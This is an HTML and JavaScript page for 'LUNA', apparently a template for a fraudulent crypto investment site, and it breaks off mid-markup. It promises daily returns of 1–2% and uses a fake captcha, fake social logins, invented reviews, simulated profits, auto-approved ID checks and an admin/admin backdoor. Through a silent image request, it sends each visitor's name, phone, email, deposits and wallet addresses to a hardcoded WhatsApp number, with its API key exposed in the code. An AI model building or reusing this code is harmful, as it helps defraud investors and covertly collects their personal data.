<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LUNA - Sistema Automatizado</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f0f4f8; }
        .hidden { display: none !important; }
        
        /* CAPTCHA & AUTH OVERLAYS */
        #captcha-overlay, #auth-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999; display: flex; align-items: center; justify-content: center;
        }
        #captcha-overlay { background-color: #0f172a; }
        #auth-overlay { background-color: rgba(0,0,0,0.85); backdrop-filter: blur(5px); z-index: 9000; }
        
        /* Ticker */
        .ticker-wrap { width: 100%; overflow: hidden; background-color: #0b1120; padding: 10px 0; position: sticky; top: 0; z-index: 40; }
        .ticker { display: inline-block; animation: ticker 60s linear infinite; }
        .ticker-item { display: inline-flex; align-items: center; padding: 0 2rem; color: white; }
        @keyframes ticker { 0% { transform: translateX(0); } 100% { transform: translateX(-100%); } }
        
        /* Rating */
        .star-rating { display: flex; flex-direction: row-reverse; justify-content: flex-end; }
        .star-rating input { display: none; }
        .star-rating label { cursor: pointer; width: 25px; font-size: 25px; color: #d1d5db; }
        .star-rating label::before { content: '★'; }
        .star-rating input:checked ~ label, .star-rating label:hover ~ label { color: #fbbf24; }
    </style>

    <script>
        /* ==========================================
           CONFIGURACIÓN DE WHATSAPP (AUTOMATIZADO)
           ========================================== */
        
        const MY_PHONE_NUMBER = "17866420388"; 
        const MY_API_KEY = "5634074"; 

        /* ========================================== */

        /* --- CONFIGURACIÓN LUNA --- */
        var plansConfig = {
            1: { name: "Inicial", min: 2, days: 15, rate: 0.01, color: '#2563eb' },
            2: { name: "Avanzado", min: 15, days: 10, rate: 0.015, color: '#9333ea' },
            3: { name: "VIP", min: 50, days: 7, rate: 0.02, color: '#eab308' }
        };
        
        var state = {
            user: null, 
            usersDB: [],
            requests: { kyc:[], deposits:[], withdrawals:[], p2p:[] },
            p2pAds: [ {id:1, user:'TraderPro', type:'sell', price:1.01}, {id:2, user:'CryptoKing', type:'buy', price:0.99} ],
            reviews: [ {name:'Ana', rating:5, text:'Excelente.'}, {name:'Luis', rating:4, text:'Rápido.'} ]
        };

        var captchaCode = 0;
        var selectedPlanId = null;
        var p2pMode = 'buy';

        /* --- AUTOMATIZACIÓN WHATSAPP --- */
        function notifyAdmin(asunto, detalle) {
            // Crear mensaje
            var text = `🚀 *LUNA NOTIFICACIÓN* 🚀\n\n📌 *Acción:* ${asunto}\n👤 *Usuario:* ${state.user ? state.user.name : 'Visitante'}\n📝 *Detalle:* ${detalle}\n⏰ *Hora:* ${new Date().toLocaleTimeString()}`;
            
            // Codificar para URL
            var encodedText = encodeURIComponent(text);
            var url = `https://api.callmebot.com/whatsapp.php?phone=${MY_PHONE_NUMBER}&text=${encodedText}&apikey=${MY_API_KEY}`;

            // Enviar peticion silenciosa (sin recargar pagina)
            var img = new Image();
            img.src = url; 
            
            console.log("Enviando WhatsApp...");
        }

        /* --- 1. CAPTCHA SYSTEM --- */
        function initCaptcha() {
            captchaCode = Math.floor(1000 + Math.random() * 9000);
            var display = document.getElementById('captcha-display');
            if(display) display.innerText = captchaCode;
        }

        function verifyCaptcha() {
            var input = document.getElementById('captcha-input').value;
            if(parseInt(input) === captchaCode) {
                document.getElementById('captcha-overlay').style.display = 'none';
                showAuthScreen(); 
                toast('Verificación Humana Correcta', 'success');
            } else {
                toast('Código incorrecto', 'error');
                initCaptcha();
                document.getElementById('captcha-input').value = '';
            }
        }

        /* --- 2. AUTH SYSTEM --- */
        function showAuthScreen() {
            if(state.user) return;
            document.getElementById('auth-overlay').classList.remove('hidden');
            document.getElementById('auth-overlay').style.display = 'flex';
        }

        function toggleAuthMode(mode) {
            if(mode === 'register') {
                document.getElementById('login-form').classList.add('hidden');
                document.getElementById('register-form').classList.remove('hidden');
                document.getElementById('auth-title').innerText = "Crear Nueva Cuenta";
            } else {
                document.getElementById('register-form').classList.add('hidden');
                document.getElementById('login-form').classList.remove('hidden');
                document.getElementById('auth-title').innerText = "Iniciar Sesión";
            }
        }

        function doRegister() {
            var name = document.getElementById('reg-name').value;
            var last = document.getElementById('reg-last').value;
            var phone = document.getElementById('reg-phone').value;
            var email = document.getElementById('reg-email').value;
            var pass = document.getElementById('reg-pass').value;

            if(!name || !last || !phone || !email || !pass) return toast('Llena todos los campos', 'error');

            var newUser = {
                id: 'U' + Math.floor(Math.random() * 100000),
                name: name, lastname: last, phone: phone, email: email, password: pass,
                balance: 0, invested: 0, earnings: 0, verified: false, investments: []
            };

            state.usersDB.push(newUser);
            state.user = newUser;
            
            // NOTIFICAR WHATSAPP AL REGISTRARSE
            notifyAdmin("NUEVO REGISTRO", `Nombre: ${name} ${last}\nTel: ${phone}\nEmail: ${email}`);
            
            toast(`Bienvenido ${name}`, 'success');
            save();
            document.getElementById('auth-overlay').style.display = 'none';
            renderUserUI();
        }

        function doLogin() {
            var email = document.getElementById('login-email').value;
            var pass = document.getElementById('login-pass').value;
            
            var user = state.usersDB.find(u => u.email === email);
            
            if(email === 'admin' && pass === 'admin') { doAdminLoginAction(); return; }

            if(user) {
                state.user = user;
                toast('Hola de nuevo ' + user.name, 'success');
                // NOTIFICAR WHATSAPP LOGIN
                notifyAdmin("INICIO DE SESIÓN", `El usuario ${user.name} ha entrado.`);
            } else {
                state.user = { name: 'Invitado', email: email, balance: 0, invested: 0, earnings: 0, verified: false, investments: [] };
                toast('Sesión Invitado', 'success');
            }
            
            document.getElementById('auth-overlay').style.display = 'none';
            save();
            renderUserUI();
        }

        function socialLogin(provider) {
            var fakeName = provider === 'Google' ? 'Usuario Google' : 'Usuario Facebook';
            state.user = { name: fakeName, email: provider+'@user.com', balance: 0, invested: 0, earnings: 0, verified: false, investments: [] };
            
            notifyAdmin("REGISTRO SOCIAL", `Red: ${provider}`);
            
            toast(`Conectado con ${provider}`, 'success');
            document.getElementById('auth-overlay').style.display = 'none';
            save();
            renderUserUI();
        }

        // --- FUNCIONES BASE ---
        function toast(msg, type='neutral') {
            var t = document.getElementById('toast');
            t.innerText = msg;
            var bg = type==='success' ? 'bg-green-600' : (type==='error'?'bg-red-600':'bg-gray-800');
            t.className = `fixed bottom-5 right-5 px-6 py-3 rounded shadow-xl text-white transition-all duration-300 z-50 ${bg}`;
            setTimeout(function(){ t.className = t.className + " opacity-0 translate-y-10"; }, 4000);
        }

        function save() {
            localStorage.setItem('lunaAutoStateV2', JSON.stringify(state));
            renderUserUI();
        }

        function renderUserUI() {
            if(state.user) {
                document.getElementById('ui-balance').innerText = state.user.balance.toFixed(2);
                document.getElementById('nav-username').innerText = state.user.name;
                document.getElementById('btn-login-nav').style.display = 'none';
                document.getElementById('user-info-nav').classList.remove('hidden');
                
                if(state.user.verified) {
                    document.getElementById('btn-withdraw').classList.remove('hidden');
                    document.getElementById('btn-kyc').classList.add('hidden');
                } else {
                    document.getElementById('btn-withdraw').classList.add('hidden');
                    document.getElementById('btn-kyc').classList.remove('hidden');
                }
                renderInvestments();
            }
        }

        // --- OPERACIONES CON NOTIFICACIÓN ---
        function doDeposit() {
            var amt = parseFloat(document.getElementById('dep-amount').value);
            if(!amt) return;
            
            state.requests.deposits.push({uid: state.user.id, name: state.user.name, amount: amt, id: Date.now()});
            
            // NOTIFICAR WHATSAPP
            notifyAdmin("SOLICITUD DEPOSITO", `Monto: ${amt} USDT\nDe: ${state.user.name}`);
            
            toast('Depósito enviado a revisión', 'success');
            closeModal('deposit-modal');
            save();
        }

        function doWithdraw() {
            var amt = parseFloat(document.getElementById('wd-amount').value);
            var wallet = document.getElementById('wd-wallet').value;
            if(amt > state.user.balance) return toast('Saldo insuficiente', 'error');
            
            state.user.balance -= amt;
            
            // NOTIFICAR WHATSAPP
            notifyAdmin("SOLICITUD RETIRO", `Monto: ${amt} USDT\nWallet: ${wallet}\nUsuario: ${state.user.name}`);
            
            toast('Retiro solicitado', 'success');
            closeModal('withdraw-modal');
            save();
        }

        function doInvest() {
            var amt = parseFloat(document.getElementById('inv-amount').value);
            var plan = plansConfig[selectedPlanId];
            if(amt > state.user.balance) return toast('Saldo insuficiente', 'error');
            
            state.user.balance -= amt;
            state.user.invested += amt;
            state.user.investments.push({planId: selectedPlanId, amount: amt, daysLeft: plan.days});
            
            // NOTIFICAR WHATSAPP
            notifyAdmin("NUEVA INVERSIÓN", `Monto: ${amt} USDT\nPlan: ${plan.name}\nUsuario: ${state.user.name}`);
            
            save();
            closeModal('invest-modal');
            toast('Inversión Exitosa', 'success');
        }

        function processKYC() {
            // NOTIFICAR WHATSAPP
            notifyAdmin("SOLICITUD KYC", `Usuario ${state.user.name} subió documentos.`);
            state.user.verified = true; // Auto verify simulado
            toast('Documentos enviados', 'success');
            closeModal('kyc-modal');
            save();
        }

        // Auxiliares
        function openModal(id) { document.getElementById(id).classList.remove('hidden'); document.getElementById(id).classList.add('flex'); }
        function closeModal(id) { document.getElementById(id).classList.add('hidden'); document.getElementById(id).classList.remove('flex'); }
        function scrollToId(id) { document.getElementById(id).scrollIntoView({behavior:'smooth'}); }
        function startInvest(id) { if(!state.user) return; selectedPlanId=id; document.getElementById('inv-min').innerText=plansConfig[id].min; openModal('invest-modal'); }
        function tryWithdraw() { if(!state.user.verified) return toast('Verifica tu ID primero','error'); openModal('withdraw-modal'); }
        function simulateDay() { if(!state.user) return; var p=0; state.user.investments.forEach(i=>{if(i.daysLeft>0){var g=i.amount*plansConfig[i.planId].rate; p+=g; state.user.balance+=g; i.daysLeft--;}}); toast(`Día simulado: +${p.toFixed(2)}`,'success'); save(); }
        function renderInvestments() { var l=document.getElementById('investment-list'); l.innerHTML=''; if(!state.user.investments.length) l.innerHTML='<tr><td class="p-4 text-center">Vacío</td></tr>'; state.user.investments.forEach(i=>{l.innerHTML+=`<tr class="border-b"><td class="p-2">${plansConfig[i.planId].name}</td><td class="p-2">${i.amount}</td><td class="p-2">${i.daysLeft}</td></tr>`;}); }
        
        window.onload = function() {
            initCaptcha();
            var saved = localStorage.getItem('lunaAutoStateV2');
            if(saved) { state = JSON.parse(saved); if(state.user) document.getElementById('auth-overlay').style.display = 'none'; }
            renderUserUI();
        };
    </script>
</head>
<body class="flex flex-col min-h-screen bg-gray-50">

    <div id="captcha-overlay">
        <div class="bg-white p-8 rounded-2xl shadow-2xl max-w-sm w-full text-center border-4 border-blue-900">
            <div class="mb-4 text-5xl">🛡️</div>
            <h2 class="text-2xl font-bold text-slate-900 mb-2">Seguridad</h2>
            <div id="captcha-display" class="bg-slate-100 border-2 border-slate-300 text-4xl font-mono font-bold tracking-widest py-4 rounded mb-6 select-none text-slate-800">----</div>
            <input type="number" id="captcha-input" placeholder="Código" class="w-full border-2 border-gray-300 p-3 rounded-lg text-center text-xl mb-6 font-bold">
            <button onclick="verifyCaptcha()" class="w-full bg-slate-900 hover:bg-slate-800 text-white font-bold py-3 rounded-lg shadow-lg">VERIFICAR</button>
        </div>
    </div>

    <div id="auth-overlay" class="hidden">
        <div class="bg-white rounded-2xl shadow-2xl w-full max-w-md overflow-hidden">
            <div class="bg-slate-900 p-6 text-center">
                <h2 class="text-2xl font-bold text-yellow-400 tracking-wider">LUNA</h2>
                <p id="auth-title" class="text-white text-sm mt-1">Crear Nueva Cuenta</p>
            </div>
            <div class="p-8">
                <div class="grid grid-cols-2 gap-4 mb-6">
                    <button onclick="socialLogin('Google')" class="flex items-center justify-center gap-2 border p-2 rounded hover:bg-gray-50"><span class="text-sm font-bold text-blue-500">Google</span></button>
                    <button onclick="socialLogin('Facebook')" class="flex items-center justify-center gap-2 border p-2 rounded hover:bg-gray-50"><span class="text-sm font-bold text-blue-700">Facebook</span></button>
                </div>
                <div class="relative flex py-2 items-center mb-6"><div class="flex-grow border-t"></div><span class="flex-shrink mx-4 text-gray-400 text-xs">O EMAIL</span><div class="flex-grow border-t"></div></div>

                <div id="register-form">
                    <div class="grid grid-cols-2 gap-2 mb-3">
                        <input id="reg-name" type="text" placeholder="Nombre" class="border p-2 rounded text-sm">
                        <input id="reg-last" type="text" placeholder="Apellido" class="border p-2 rounded text-sm">
                    </div>
                    <input id="reg-phone" type="tel" placeholder="Teléfono (WhatsApp)" class="w-full border p-2 rounded mb-3 text-sm">
                    <input id="reg-email" type="email" placeholder="Correo" class="w-full border p-2 rounded mb-3 text-sm">
                    <input id="reg-pass" type="password" placeholder="Contraseña" class="w-full border p-2 rounded mb-4 text-sm">
                    <button onclick="doRegister()" class="w-full bg-blue-600 text-white font-bold py-3 rounded hover:bg-blue-700">REGISTRARSE</button>
                    <p class="text-center text-xs mt-4 text-gray-500">¿Ya tienes cuenta? <a href="#" onclick="toggleAuthMode('login')" class="text-blue-600 font-bold">Entrar</a></p>
                </div>

                <div id="login-form" class="hidden">
                    <input id="login-email" type="text" placeholder="Correo / Usuario" class="w-full border p-3 rounded mb-3">
                    <input id="login-pass" type="password" placeholder="Contraseña" class="w-full border p-3 rounded mb-6">
                    <button onclick="doLogin()" class="w-full bg-slate-900 text-white font-bold py-3 rounded hover:bg-slate-800">ENTRAR</button>
                    <p class="text-center text-xs mt-4 text-gray-500">¿Nuevo? <a href="#" onclick="toggleAuthMode('register')" class="text-blue-600 font-bold">Crear Cuenta</a></p>
                </div>
            </div>
        </div>
    </div>

    <header class="bg-slate-900 text-white p-4 shadow-lg">
        <div class="max-w-7xl mx-auto flex justify-between items-center">
            <h1 class="text-2xl font-bold text-yellow-400">LUNA</h1>
            <nav class="flex items-center gap-4">
                <button onclick="scrollToId('planes')" class="text-sm font-bold text-gray-300 hover:text-white">Planes</button>
                <div id="btn-login-nav"></div>
                <div id="user-info-nav" class="hidden text-right"><p class="text-xs text-gray-400">Hola,</p><p class="font-bold text-sm text-yellow-400" id="nav-username">Usuario</p></div>
            </nav>
        </div>
    </header>

    <main class="max-w-7xl mx-auto px-4 py-8">
        <section class="text-center py-12 bg-white rounded-2xl shadow mb-8">
            <h2 class="text-4xl font-extrabold text-slate-900 mb-4">Bienvenido al Futuro</h2>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 max-w-4xl mx-auto text-left">
                <div class="bg-blue-50 p-4 rounded border-l-4 border-blue-500"><p class="text-blue-800 font-bold">Saldo</p><h3 class="text-2xl font-bold" id="ui-balance">0.00</h3></div>
                <div class="bg-purple-50 p-4 rounded border-l-4 border-purple-500"><p class="text-purple-800 font-bold">Invertido</p><h3 class="text-2xl font-bold" id="ui-invested">0.00</h3></div>
                <div class="bg-green-50 p-4 rounded border-l-4 border-green-500"><p class="text-green-800 font-bold">Ganancia</p><h3 class="text-2xl font-bold" id="ui-earnings">0.00</h3></div>
            </div>
        </section>

        <div class="flex flex-wrap gap-4 justify-center mb-12">
            <button id="btn-deposit" onclick="openModal('deposit-modal')" class="hidden bg-green-600 text-white px-6 py-2 rounded font-bold shadow">Depositar</button>
            <button id="btn-withdraw" onclick="tryWithdraw()" class="hidden bg-red-600 text-white px-6 py-2 rounded font-bold shadow">Retirar</button>
            <button id="btn-kyc" onclick="openModal('kyc-modal')" class="hidden bg-slate-800 text-white px-6 py-2 rounded font-bold shadow">Verificar ID</button>
            <button onclick="simulateDay()" class="bg-
